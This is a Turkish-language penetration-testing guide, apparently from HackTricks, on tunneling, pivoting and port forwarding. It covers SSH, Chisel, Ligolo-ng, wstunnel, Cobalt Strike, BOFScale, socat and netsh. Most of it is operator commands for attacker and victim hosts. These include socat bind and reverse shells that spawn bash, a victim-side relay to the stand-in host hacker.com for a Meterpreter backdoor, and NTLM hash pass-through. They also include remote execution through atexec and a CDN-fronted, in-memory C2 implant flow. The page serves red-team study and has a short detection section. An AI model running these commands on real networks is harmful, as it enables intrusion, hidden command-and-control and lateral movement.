# Tünelleme ve Port Yönlendirme

{{#include ../banners/hacktricks-training.md}}

## Nmap ipucu

> [!WARNING]
> Nmap'in proxy desteği TCP bağlantılarıyla sınırlıdır ve ping, port veya işletim sistemi tespit taramalarını etkilemez. Tarayıcı bir SOCKS proxy arkasındaysa, **host keşfini devre dışı bırakın** (`-Pn`) ve **TCP connect taraması** (`-sT`) kullanın.<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Son komut, hesabı ve WinRM hostunu belirtmek için Evil-WinRM'in `-u` ve `-i` seçeneklerini kullanır; varsayılan WinRM portu 5985'tir.<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSH, X11 bağlantılarını, isteğe bağlı TCP portlarını ve Unix domain socket’lerini şifreli kanalı üzerinden yönlendirebilir.<sup>[[6]](#references)</sup>

SSH grafik bağlantısı (X)

`-Y`, güvenilir X11 yönlendirmesini etkinleştirir ve `-C`, yönlendirilen veriler için sıkıştırma ister.<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

SSH Server'da yeni port aç --> Diğer port

Remote (`-R`) forwarding, SSH server üzerinde dinler ve yerel tarafa bağlanır; açıkça belirtilen bind address, hangi arayüzlerin bu listener'a erişebileceğini belirler.<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Yerel port --> Ele geçirilmiş host (SSH) --> Third_box:Port

Yerel (`-L`) forwarding, client üzerinde dinler ve hedefe SSH server tarafında bağlanır.<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Yerel Port --> Ele geçirilmiş host (SSH) --> Herhangi bir yer

Dynamic (`-D`) forwarding, bağlantıların uzak taraftan açıldığı yerel bir SOCKS4/SOCKS5 dinleyicisi oluşturur.<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### ProxyJump ile çok atlamalı bağlantı

`-J`/`ProxyJump`, hedefe virgülle ayrılmış bir veya daha fazla jump host üzerinden bağlanır. Forwarding seçenekleri yine son SSH bağlantısına aittir; bu nedenle aşağıdaki SOCKS listener, ilk bastion yerine `internal-target` üzerinden hedeflere bağlanır. Böylece bir jump host'ta oturum açıp orada ikinci bir SSH client başlatmanız gerekmez.<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

Jump makinelerine özgü seçenekler `~/.ssh/config` dosyasına eklenmelidir; hedef makine için komut satırında belirtilen yapılandırma, ara makinelerde otomatik olarak uygulanmaz.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Bu, iç ağdaki makinelerden DMZ üzerinden kendi makinenize reverse shell almak için kullanışlıdır:

Sunucunun `GatewayPorts` ayarı, uzak bir yönlendirmenin loopback dışındaki bir adrese bağlanıp bağlanamayacağını kontrol eder; varsayılan değeri `no`’dur.<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

Bu root tabanlı örnek, her iki hostta da tunnel device'ları oluşturur. Sunucu tun forwarding'e izin vermeli ve seçilen hesabın tun device'ına erişimi olmalıdır; burada `root` hesabını kullanmanın bir yolu `PermitRootLogin yes` ayarını yapmaktır.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Sunucu tarafında forwarding'i etkinleştirin

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

İstemci tarafında yeni bir rota ayarlayın

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Güvenlik – Terrapin Attack (CVE-2023-48795)**  
> OpenSSH 9.6, Terrapin'in erken taşıma katmanındaki bütünlük saldırısına karşı koymak için strict-KEX uzantısını ekledi. Mümkünse her iki tarafı da güncelleyin ve eski uygulamalarda, yalnızca sürüme bakarak yönlendirilen bir kanalın korunduğunu varsaymak yerine üretici yönergelerini izleyin.<sup>[[8]](#references)</sup>

## SSHUTTLE

Bir alt ağdaki tüm **trafiği** bir host üzerinden **ssh** ile **tünelleyebilirsiniz**.\
Örneğin, 10.10.10.0/24 adresine giden tüm trafiği yönlendirmek için

`sshuttle`, SSH üzerinden şeffaf proxy desteği sağlar ve aşağıda gösterildiği gibi alt ağ seçimini ve özel bir SSH komutunu destekler.<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Özel anahtarla bağlanın

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

Metasploit'in `portfwd` özelliği local ve remote forwarding'i destekler. SOCKS proxy modülü ise session routes veya `autoroute` ile çalışacak şekilde tasarlanmıştır ve bu örneklerde varsayılan olarak 1080 portunu dinler.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Local port --> Ele geçirilmiş makine (active session) --> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Başka bir yol:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Cobalt Strike'ın Beacon'ı, SOCKS4a/SOCKS5 bağlantılarını bir Beacon üzerinden aktarabilir; `rportfwd` ele geçirilmiş host üzerinde bağlantı noktası bağlarken, `rportfwd_local` hedef bağlantısını Cobalt Strike istemcisinden başlatır.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Beacon üzerinden trafik yönlendirmesi gereken arayüzlerde Team Server üzerinde bir bağlantı noktası açın.<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> Bu durumda **port, Team Server'da değil Beacon host üzerinde açılır** ve trafik Team Server'a, oradan da belirtilen host:port'a gönderilir.<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

Reverse-forwarding kılavuzu şu davranışı belirtir:<sup>[[14]](#references)</sup>

- Beacon'ın reverse port forward özelliği, **tek tek makineler arasında trafik aktarmak için değil, Team Server'a trafik tünellemek için tasarlanmıştır**.
- Trafik, P2P bağlantıları da dahil olmak üzere **Beacon'ın C2 trafiği içinde tünellenir**.
- Yüksek portlar genellikle ayrıcalıklı port kısıtlamalarını önler, ancak hedef işletim sisteminin politikaları ve mevcut dinleyiciler yine geçerlidir.

### rPort2Port local

> [!WARNING]
> Bu durumda **port, Team Server'da değil Beacon host'unda açılır** ve **trafik Team Server'a değil Cobalt Strike client'a gönderilir**; oradan da belirtilen host:port'a iletilir.<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## Tailcat: hesapsız userspace TCP yönlendirme

Tailcat, Tailscale control plane'i olmadan Tailscale'in WireGuard/NAT traversal/DERP data plane'ini kullanır. Tailscale hesabı veya yönetici ayrıcalıkları gerektirmez; host route'ları yüklemez ya da DNS'i değiştirmez. [Tailscale Serve/Funnel](reverse-shells/expose-local-to-the-internet.md#tailscale-funnel--serve) veya process içi [BOFScale tailnet](#bofscale---cdn-fronted-in-process-tailnet)'ten farklı olarak, sunucu bir *tailcat address*'i ayrı bir kanaldan paylaşır. İstemci, bu adresi kullanarak uzak node'un sunduğu bir porta erişir.<sup>[[62]](#references)</sup>

Uzak node'da `4444` portunu zaten dinleyen bir TCP servisi varsa, orada `serve` komutunu çalıştırın ve yazdırılan adresi istemcideki `forward` komutuna verin. İkinci komut varsayılan olarak `127.0.0.1:18080` adresine bağlanır; böylece yalnızca normal TCP socket'lerini destekleyen yerel bir process, bu loopback portuna bağlanırken Tailcat trafiği uzak `4444` portuna taşır.<sup>[[62]](#references)</sup> Port numaraları Tailcat'e özgü değildir.<sup>[[62]](#references)</sup>

```bash
# Remote node with a service on localhost:4444
tailcat serve 4444
# Client node; replace the placeholder with the address printed above
tailcat forward <tc-address> 18080:4444
```

Adres, sunucunun WireGuard public key'ini ve güncel sürümlerde varsayılan olarak bir pre-shared key içerir. Bunu bir credential olarak değerlendirin: kısıtlamasız bir sunucu, adresi bilen bir peer'ı kabul eder. Ephemeral adres, sunucu kapandığında çalışmayı durdurur. Kaydedilmiş bir `default` key'i, sonraki çalıştırmalarda düz `serve` komutunun aynı adresi kullanmasını sağlar; bu nedenle başlangıç mesajını kontrol edin ve adres açığa çıkabilecekse istemcileri `serve --allow` ile kısıtlayın.<sup>[[62]](#references)</sup>

Bağlantılar doğrudan bir UDP yolu veya DERP relay kullanabilir. Bu, özel bir C2 domain'i gereksinimini ortadan kaldırır ancak ağ etkinliğini görünmez hâle getirmez.<sup>[[62]](#references)[[63]](#references)</sup>

## BOFScale - CDN üzerinden yönlendirilen, süreç içi tailnet

[BOFScale](https://github.com/NetSPI/BOFscale), TUN driver veya service yüklemeden, değiştirilmiş bir Tailscale overlay'ini Windows C2 implant'ı içinde çalıştırır. Üç bileşeni; asenkron bir CGo `c-shared` `tailscaled` BOF-PE, yerel API ile iletişim kuran küçük bir C++ BOF-PE ve asenkron bir `socksportfwd` TCP-to-SOCKS5 bridge'dir.<sup>[[53]](#references)[[54]](#references)</sup>

### CDN uyumlu TS2021 ve DERP

Tailscale, Noise tabanlı TS2021 control channel ve DERP relay için normalde özel HTTP upgrade'leri kullanır. BOFScale bu byte stream'lerini korur, ancak bunları RFC 6455 WebSocket'leri içinde taşır ve `Sec-WebSocket-Protocol: ts2021` veya `derp` kullanır. Böylece operatörün kontrolündeki bir Headscale/DERP origin'i, yalnızca standart WebSocket upgrade'lerini kabul eden bir CDN'in arkasında bulunabilir. Değiştirilmiş istemci, HTTP `500` sonrasında TS2021'i WebSocket üzerinden yeniden dener, HTTP `426` sonrasında DERP'i yeniden dener ve DERP WebSocket dialer'ının host proxy yapılandırmasını kullanmasını sağlar; BOF, bilinen ilk denemeyi atlamak için `TS_DEBUG_DERP_WS_CLIENT=1` ayarlar.<sup>[[53]](#references)[[54]](#references)</sup>

CDN ve origin proxy, `/ts2021` ve `/derp` için WebSocket upgrade'lerini korumalı, `/key` isteklerini normal HTTP olarak iletmeli ve relay oturumları süresiz açık kalabileceğinden dahili read/write timeout'ları devre dışı bırakmalıdır. Sağlanan Headscale yapılandırması `verify_clients` özelliğini etkinleştirir, yalnızca operatörün gömülü DERP map'ini yayımlar ve Tailscale tarafından işletilen relay'lere fallback yapılmasını önlemek için `derp.urls` alanını boş bırakır.<sup>[[53]](#references)[[54]](#references)</sup>

### Süreç içi daemon ve named-pipe kontrolü

Üzerinde değişiklik yapılmadığı sürece, BOF entry point `tailscaled`'ı `-tun=userspace-networking`, `-state mem:` ve `-no-logs-no-support` parametreleriyle başlatır, ardından UUID adında bir pipe oluşturur. Go stdout/stderr akışını OS pipe üzerinden Beacon output API'sine yönlendirir. Böylece daemon ve Go runtime'ın tamamı bellekte kalır, ancak state ve log'lar Tailscale dizinine yazılmaz.<sup>[[53]](#references)[[54]](#references)</sup>

Hafif istemci, bu pipe üzerinden Tailscale'in HTTP/1.0 yerel API'sini yeniden oluşturur. Daemon'ın `safesocket` katmanı pipe istemcisini impersonate ettiğinden, pipe'ı `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` ile açar; `Tailscale-Cap: 125` gönderir ve yerel API'yi `up`, `down`, `status`, route advertisement ve shutdown işlemlerine eşler.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Daemon'a kapanmasını söyledikten sonra elle map edilmiş bir Go BOF-PE'yi unload etmeyin: runtime ve garbage collector goroutine'leri, loader'ın belleği unmap etmesinden sonra da çalışmaya devam edebilir. `tailscaled`'ı geçici bir süreçte çalıştırın ve son temizlik için bu süreci sonlandırın.<sup>[[54]](#references)</sup>

### Host kaynaklı trafiği userspace SOCKS5 üzerinden yönlendirme

Gelen tailnet bağlantıları ve duyurulan subnet route'ları userspace network stack içinde çalışır, ancak ele geçirilmiş host üzerindeki normal süreçlerin overlay'e giden bir OS route'u yoktur. Bu nedenle `socksportfwd`, victim'a dönük bir TCP portunu dinler, daemon'ın `0.0.0.0:1080` listener'ıyla SOCKS5 `NO AUTH` müzakeresi yapar, bir tailnet hedefine `CONNECT` isteği gönderir ve her iki yöndeki trafiği asenkron olarak aktarır. Hedef bir MagicDNS adı olduğunda `ATYP_DOMAIN` kullanır; böylece `tailscaled` adı çözümler ve ad Windows resolver'ına açığa çıkmaz.<sup>[[53]](#references)[[54]](#references)</sup>

Aşağıda asgari bir operatör akışı gösterilmiştir; bu CDN tasarımını kullanabilmek için hem operatör node'u hem de implant, değiştirilmiş binary'leri kullanmalıdır; stock Tailscale bu tasarım üzerinden bağlantı kuramaz.<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

Yerel forward, görünürdeki kimlik doğrulama listener'ını relay aracından ayırabilir: bir makineyi ele geçirilmiş host'un bağlı portuna kimlik doğrulaması yapmaya zorlayın, bağlantıyı tailnet üzerinden `ntlmrelayx`'e forward edin ve AD CS, LDAP, HTTP, SMB veya başka bir uyumlu hedefe relay edin. Zafiyete özgü aşamalar için [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) ve [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) bölümlerine bakın; BOFScale yalnızca transport katmanıdır.<sup>[[54]](#references)</sup>

### Tespit

Tek bir zayıf gösterge yerine bu göstergelerin bir arada bulunmasını araştırın: normalde Go tabanlı olmayan bir process'te Go runtime, izinleri geniş olan `D:(A;;GA;;;WD)` SDDL'li bir UUID pipe, beklenmeyen bir `0.0.0.0:1080` SOCKS listener'ı ve CDN adreslerine kurulan uzun süreli TLS WebSocket bağlantıları. TLS incelemesi yapılıyorsa, sahibi yetkili bir `tailscaled` service olmayan process'lerde `Sec-WebSocket-Protocol: derp` veya `ts2021` değerlerini işaretleyin. Repository'deki `bofscale.yar` kuralları, üç BOF-PE bileşeninin tümü için memory signature'ları sağlar.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Proje, `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` ve `tunnel.php` gibi web tunnel endpoint'leri sağlar; yerel proxy'yi başlatmadan önce desteklenen endpoint'lerden birini yükleyin.<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) adresindeki releases sayfasından indirebilirsiniz.\
Chisel, SSH ile korunan bir bağlantı kullanarak TCP/UDP trafiğini HTTP üzerinden taşır; uyumlu client/server derlemeleri kullanın ve seçilen sürümün komut sözdizimini doğrulayın.<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Port forwarding

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel), statik veya dinamik forward'ları WebSocket, HTTP/2 ya da WebTransport (QUIC üzerinden HTTP/3) ile taşır. Güncel derlemeler, hem forward hem de reverse modlarında TCP, UDP, Unix socket'leri, stdio, SOCKS5, HTTP proxying ve Linux transparent-proxy listener'larını destekler.<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

Sunucuyu saldırganın makinesinde çalıştırın ve pivot'un `-R` ile dışarıya bağlantı kurmasını sağlayın. Bu yönde SOCKS5 listener'ı **server** üzerinde oluşturulur; istenen bağlantılar ise **client/pivot** ağından başlatılır.<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

Reverse static forward aynı yönü kullanır. Örneğin aşağıdaki komut, pivot tarafından erişilen `10.10.10.20:445` adresini saldırganın loopback arayüzündeki `8445` portunda açığa çıkarır:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Egress ve taşıma ayrıntıları

- Açık bir HTTP proxy üzerinden geçmek için istemciye `-p http://user:pass@proxy:8080` ekleyin. `curl` gibi istemcilerde `socks5h://127.0.0.1:1080` kullanın (veya uygulamada proxied DNS'i etkinleştirin); böylece dahili adlar yerel resolver'a sızmak yerine tünelin ötesinde çözümlenir.<sup>[[52]](#references)</sup>
- `wss://`, TLS korumalı WebSocket'i seçer. `https://` kullanan bir istemci HTTP/2'yi seçer; ancak reverse proxy/CDN'lerin tamponlama yapması veya HTTP/1'e dönüştürmesi çift yönlü akışı genellikle bozar. Bu modu test ederken wstunnel sunucusunu doğrudan erişime açın.<sup>[[52]](#references)</sup>
- `wts://`, QUIC üzerinden WebTransport'ı seçer. Sunucuyu `--enable-webtransport` (veya bir `wts://` listen URL'si) ile başlatın ve dinleme portunda UDP'ye izin verin. Bu mod, geleneksel bir HTTP `CONNECT` proxy'sinden geçemez; çünkü bu proxy TCP taşır.<sup>[[52]](#references)</sup>

> [!WARNING]
> Upstream proje, gömülü self-signed sertifikasının gizlilik koruması sağladığını varsaymamanız konusunda uyarıyor. Geçerli bir özel sertifika ve `--tls-verify-certificate` (veya mTLS) kullanmayı tercih edin, uzaktan erişim kasıtlı değilse proxy listener'larını loopback üzerinde tutun ve gizliliğin önemli olduğu durumlarda zaten güvenli olan protokolleri tünelleyin.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ng hızlı başlangıç kılavuzu; proxy üzerinde bir TUN arayüzü, agent için sertifika parmak izi doğrulaması ve tünellenen ağ için route yapılandırması belgeliyor.<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Agent Bağlama ve Dinleme

Ligolo-ng, proxy tarafındaki bir adrese yönlendirme yapan listener'ları agent üzerinde ekleyebilir ve ayrılmış `240.0.0.0/4` aralığı, agent üzerindeki servislere erişmek için route edilebilir.<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Agent'ın Yerel Portlarına Erişim

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot, kurbandan ters tüneli başlatır ve saldırganın loopback adresinde bir SOCKS4 proxy'si sunar; README'sinde NTLM-proxy kimlik bilgileri ve hash seçenekleri de belgelenmiştir.<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

**NTLM proxy üzerinden pivoting**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat; `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` ve `PROXY` gibi adres türlerini bir araya getirir; aşağıdaki örneklerde belgelenmiş bu uç noktalar birleştirilmiştir.<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### Port2Port socks üzerinden

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### SSL Socat üzerinden Meterpreter

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

socat'ın belgelenmiş `PROXY` adres türünü kullanarak, kurbanın konsolunda son satır yerine bu satırı çalıştırıp **kimlik doğrulaması gerektirmeyen bir proxy** üzerinden geçiş yapabilirsiniz.<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tüneli

**/bin/sh konsolu**

Her iki tarafta da sertifika oluşturun: Client ve Server

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

Yerel SSH portunu (22), saldırgan ana bilgisayarın 443 portuna bağlayın.

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Plink, PuTTY'nin komut satırı bağlantı aracıdır ve `ssh`'ye benzer SSH forwarding seçeneklerine sahiptir.<sup>[[22]](#references)</sup>

SSH portu için büyük `-P` kullanın. `-pw`, uyumluluk amacıyla korunmuştur ancak parolayı işlem listesinde açığa çıkarır; mümkün olduğunda key authentication veya `-pwfile` tercih edin.<sup>[[22]](#references)[[23]](#references)</sup>

Bu binary victim üzerinde çalıştırılacak ve bir SSH client olduğundan, reverse connection için SSH servisini ve portunu açın; aşağıdaki kullanım, yerel olarak erişilebilen bir portu attacker's machine'e forward etmek için `-R` kullanır.<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Kalıcı `portproxy` kurallarını oluştururken veya değiştirirken ana bilgisayarın gerektirdiği izinlere sahip bir bağlam kullanın. Microsoft, aşağıda kullanılan `v4tov4` ekleme, gösterme ve silme biçimlerini belgeliyor.<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### `portproxy`'i zamanlanmış bir görev aracılığıyla dağıtma

Yönetici kimlik bilgileri mevcut olduğunda, uzaktaki Task Scheduler yürütmesi özel bir relay yüklemeden yerel bir yönlendirme kuralı yükleyebilir. Örneğin, [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) bir pivot'un TCP/443 üzerinde dinlemesini ve bağlantıyı dahili bir SMB hizmetine aktarmasını sağlayabilir.<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

Kural kalıcıdır; bu nedenle `netsh interface portproxy show v4tov4` komutuyla listeleyin ve test ettikten sonra açıkça kaldırın. `portproxy` yalnızca yönlendirme sağlar; ana makinenin güvenlik duvarı da dinleme portuna izin vermelidir.<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

**Sisteme RDP erişiminizin olması gerekir.**\
İndirin:

